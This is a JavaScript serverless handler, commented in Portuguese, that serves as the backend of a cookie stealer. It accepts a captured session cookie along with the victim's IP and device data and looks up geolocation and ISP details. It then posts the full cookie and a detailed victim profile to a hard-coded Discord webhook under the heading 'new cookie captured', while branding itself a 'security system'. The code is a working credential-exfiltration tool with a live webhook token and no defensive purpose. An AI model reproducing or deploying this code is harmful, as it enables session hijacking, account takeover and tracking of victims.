export default async function handler(req, res) {
  // Permitir CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Responder preflight requests
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Apenas POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { cookie, ip, device, timestamp } = req.body;

    // Validar dados
    if (!cookie || cookie.length < 50) {
      return res.status(400).json({ error: 'Cookie inválido' });
    }

    // Buscar informações detalhadas do IP
    let ipInfo = {};
    try {
      const ipResponse = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
      ipInfo = await ipResponse.json();
    } catch (e) {
      console.error('Erro ao buscar info do IP:', e);
    }

    // Buscar informações de geolocalização mais detalhadas (opcional)
    let geoInfo = {};
    try {
      const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
      geoInfo = await geoResponse.json();
    } catch (e) {
      console.error('Erro ao buscar geo info:', e);
    }

    // Extrair informações do User-Agent
    const ua = req.headers['user-agent'] || '';
    const browserInfo = getBrowserInfo(ua);
    const osInfo = getOSInfo(ua);
    const deviceInfo = getDeviceInfo(ua);
    
    // Capturar todos os headers
    const headers = req.headers;
    const acceptLanguage = headers['accept-language'] || 'Desconhecido';
    const acceptEncoding = headers['accept-encoding'] || 'Desconhecido';
    const connection = headers['connection'] || 'Desconhecido';
    const referer = headers['referer'] || 'Desconhecido';
    const origin = headers['origin'] || 'Desconhecido';
    const secChUa = headers['sec-ch-ua'] || 'Desconhecido';
    const secChUaMobile = headers['sec-ch-ua-mobile'] || 'Desconhecido';
    const secChUaPlatform = headers['sec-ch-ua-platform'] || 'Desconhecido';

    // WEBHOOK DO DISCORD
    const webhookURL = 'https://canary.discord.com/api/webhooks/1477057706568323195/4545g7HNyqcjMCkJe2t95-djEoA-kuXgu-VY1u_zb6slpT3lpdmbwyxDl8urWU51Effi';

    // 🔥 ENVIAR COOKIE COMPLETO + TODAS AS INFORMAÇÕES 🔥
    const embed = {
      content: '@everyone',
      embeds: [{
        title: '🔐 **NOVA CAPTURA DE COOKIE**',
        description: 'Um novo cookie foi capturado pelo sistema Aurora',
        color: 0x6366f1,
        fields: [
          {
            name: '🍪 **COOKIE COMPLETO**',
            value: '```' + cookie + '```'
          },
          {
            name: '📊 **INFORMAÇÕES DO DISPOSITIVO**',
            value: `\`\`\`yml
Dispositivo: ${device}
Tipo: ${deviceInfo}
Navegador: ${browserInfo.nome} ${browserInfo.versao}
Sistema: ${osInfo.nome} ${osInfo.versao}
Idioma: ${acceptLanguage}
Engine: ${browserInfo.engine}
Modo: ${secChUaMobile === '?0' ? 'Desktop' : 'Mobile'}
Plataforma: ${secChUaPlatform}
\`\`\``
          },
          {
            name: '🌍 **INFORMAÇÕES DO IP**',
            value: `\`\`\`yml
IP: ${ip}
País: ${ipInfo.country || 'Desconhecido'} (${ipInfo.countryCode || ''})
Região: ${ipInfo.regionName || 'Desconhecido'}
Cidade: ${ipInfo.city || 'Desconhecido'}
CEP: ${ipInfo.zip || 'Desconhecido'}
Latitude: ${ipInfo.lat || 'Desconhecido'}
Longitude: ${ipInfo.lon || 'Desconhecido'}
Fuso Horário: ${ipInfo.timezone || 'Desconhecido'}
Provedor: ${ipInfo.isp || 'Desconhecido'}
Organização: ${ipInfo.org || 'Desconhecido'}
ASN: ${ipInfo.as || 'Desconhecido'}
Mobile: ${ipInfo.mobile ? 'Sim' : 'Não'}
Proxy/VPN: ${ipInfo.proxy ? 'Sim' : 'Não'}
Hosting: ${ipInfo.hosting ? 'Sim' : 'Não'}
Moeda: ${geoInfo.currency || 'Desconhecido'}
Código Postal: ${geoInfo.postal || 'Desconhecido'}
\`\`\``
          },
          {
            name: '🔧 **HEADERS DA REQUISIÇÃO**',
            value: `\`\`\`yml
Accept-Language: ${acceptLanguage}
Accept-Encoding: ${acceptEncoding}
Connection: ${connection}
Referer: ${referer}
Origin: ${origin}
Sec-CH-UA: ${secChUa}
\`\`\``
          },
          {
            name: '⏰ **TIMESTAMP**',
            value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
            inline: true
          },
          {
            name: '📅 **DATA COMPLETA**',
            value: `\`${new Date().toLocaleString('pt-BR')}\``,
            inline: true
          },
          {
            name: '🔢 **ID DA SESSÃO**',
            value: `\`${generateSessionId()}\``,
            inline: true
          },
          {
            name: '📏 **TAMANHO DO COOKIE**',
            value: `\`${cookie.length} caracteres\``,
            inline: true
          },
          {
            name: '🔐 **SEGURANÇA**',
            value: `\`\`\`yml
HTTPS: ${req.headers['x-forwarded-proto'] === 'https' ? 'Sim' : 'Não'}
Cloudflare: ${req.headers['cf-ray'] ? 'Sim' : 'Não'}
IP Confiável: ${ipInfo.hosting ? 'Não (Hosting)' : 'Sim'}
Risco: ${ipInfo.proxy ? 'ALTO (Proxy/VPN)' : 'Baixo'}
\`\`\``
          }
        ],
        footer: {
          text: 'Aurora Security System • Proteção Avançada • v2.0',
          icon_url: 'https://media.discordapp.net/attachments/1478076459074719877/1478567053999869993/Gemini_Generated_Image_17qz9117qz9117qz.png?ex=69a8de60&is=69a78ce0&hm=30c2567486c3f374e4fdc3e9ed7712ff5613520c72a7264d002dd1ad2b696328&=&format=webp&quality=lossless&width=240&height=233'
        },
        timestamp: new Date().toISOString(),
        thumbnail: {
          url: 'https://media.discordapp.net/attachments/1456825082507956428/1477117859665805312/clideo_editor_64f89f8646e04ff7b36cd451bf005602_online-video-cutter.com.gif?ex=69a835f5&is=69a6e475&hm=47008cff92b32b165301e19e2f528da6f4b03f42900a8401c989976a082459cd&=&width=569&height=320'
        }
      }]
    };

    // Enviar para o Discord
    const response = await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    });

    if (!response.ok) {
      throw new Error('Falha ao enviar para Discord');
    }

    return res.status(200).json({ success: true });
    
  } catch (error) {
    console.error('Erro:', error);
    return res.status(500).json({ error: 'Erro interno' });
  }
}

// Funções auxiliares melhoradas
function getBrowserInfo(ua) {
  const info = {
    nome: 'Desconhecido',
    versao: 'Desconhecido',
    engine: 'Desconhecido'
  };

  // Detectar Chrome
  if (ua.includes('Chrome') && !ua.includes('Edg')) {
    info.nome = 'Google Chrome';
    const match = ua.match(/Chrome\/(\d+\.\d+)/);
    info.versao = match ? match[1] : 'Desconhecido';
    info.engine = 'Blink';
  }
  // Detectar Firefox
  else if (ua.includes('Firefox')) {
    info.nome = 'Mozilla Firefox';
    const match = ua.match(/Firefox\/(\d+\.\d+)/);
    info.versao = match ? match[1] : 'Desconhecido';
    info.engine = 'Gecko';
  }
  // Detectar Safari
  else if (ua.includes('Safari') && !ua.includes('Chrome')) {
    info.nome = 'Apple Safari';
    const match = ua.match(/Version\/(\d+\.\d+)/);
    info.versao = match ? match[1] : 'Desconhecido';
    info.engine = 'WebKit';
  }
  // Detectar Edge
  else if (ua.includes('Edg')) {
    info.nome = 'Microsoft Edge';
    const match = ua.match(/Edg\/(\d+\.\d+)/);
    info.versao = match ? match[1] : 'Desconhecido';
    info.engine = 'Blink';
  }
  // Detectar Opera
  else if (ua.includes('OPR') || ua.includes('Opera')) {
    info.nome = 'Opera';
    const match = ua.match(/(OPR|Opera)\/(\d+\.\d+)/);
    info.versao = match ? match[2] : 'Desconhecido';
    info.engine = 'Blink';
  }

  return info;
}

function getOSInfo(ua) {
  const info = {
    nome: 'Desconhecido',
    versao: 'Desconhecido'
  };

  if (ua.includes('Windows NT 10.0')) {
    info.nome = 'Windows';
    info.versao = '10/11';
  } else if (ua.includes('Windows NT 6.3')) {
    info.nome = 'Windows';
    info.versao = '8.1';
  } else if (ua.includes('Windows NT 6.2')) {
    info.nome = 'Windows';
    info.versao = '8';
  } else if (ua.includes('Windows NT 6.1')) {
    info.nome = 'Windows';
    info.versao = '7';
  } else if (ua.includes('Mac OS X')) {
    info.nome = 'macOS';
    const match = ua.match(/Mac OS X (\d+[._]\d+[._]\d+)/);
    info.versao = match ? match[1].replace(/_/g, '.') : 'Desconhecido';
  } else if (ua.includes('Linux')) {
    info.nome = 'Linux';
    if (ua.includes('Android')) {
      info.nome = 'Android';
      const match = ua.match(/Android (\d+\.\d+)/);
      info.versao = match ? match[1] : 'Desconhecido';
    } else if (ua.includes('iPhone') || ua.includes('iPad')) {
      info.nome = 'iOS';
      const match = ua.match(/OS (\d+_\d+)/);
      info.versao = match ? match[1].replace(/_/g, '.') : 'Desconhecido';
    }
  }

  return info;
}

function getDeviceInfo(ua) {
  if (ua.includes('Mobile')) {
    if (ua.includes('iPhone')) return 'iPhone';
    if (ua.includes('iPad')) return 'iPad';
    if (ua.includes('Android')) return 'Android Smartphone';
    return 'Celular';
  }
  if (ua.includes('Tablet')) return 'Tablet';
  if (ua.includes('TV')) return 'Smart TV';
  return 'Computador';
}

function generateSessionId() {
  return Math.random().toString(36).substring(2, 15) + 
         Math.random().toString(36).substring(2, 15);
}
